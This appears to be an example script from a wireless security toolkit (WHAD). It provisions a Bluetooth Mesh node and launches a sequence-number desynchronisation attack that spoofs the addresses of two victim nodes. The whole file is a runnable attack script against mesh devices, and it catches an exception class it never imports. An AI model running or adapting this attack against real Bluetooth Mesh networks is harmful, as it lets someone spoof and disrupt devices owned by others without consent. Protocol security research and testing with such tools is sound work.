from whad.device import WhadDevice
from whad.ble.exceptions import ConnectionLostException
import sys
from whad.btmesh.connector.provisionee import Provisionee
from whad.btmesh.attacker.seqnum_desynch import (
    SeqNumDesynchAttacker,
    SeqNumDesynchConfiguration,
)
from time import sleep
from whad.btmesh.stack.utils import MeshMessageContext


if len(sys.argv) != 2:
    # Retrieve target interface
    print("Usage: %s [provisionee]" % sys.argv[0])
    exit(1)


interface = sys.argv[1]

try:
    dev = WhadDevice.create(interface)

    provisionee = Provisionee(dev)
    provisionee.start()
    provisionee.profile.auto_provision()

    print("Node is (auto) provisioned !")

    # Create the attacker object and launch the attack
    attack_conf = SeqNumDesynchConfiguration()
    attack_conf.victims = [
        0x0004,
        0x0005,
    ]  # list of victims, .i.e the ones we spoof the address of

    attacker = SeqNumDesynchAttacker(connector=provisionee, configuration=attack_conf)

    print(
        "Lauching the SeqNumDesynch attack, spoofing %s"
        % str([hex(addr) for addr in attack_conf.victims])
    )
    attacker.launch(asynch=False)

    attacker.show_result()


except ConnectionLostException as e:
    print("Connection lost", e)

except (KeyboardInterrupt, SystemExit):
    dev.close()

except WhadDeviceNotFound:
    print("[e] Device not found")
    exit(1)

exit(0)
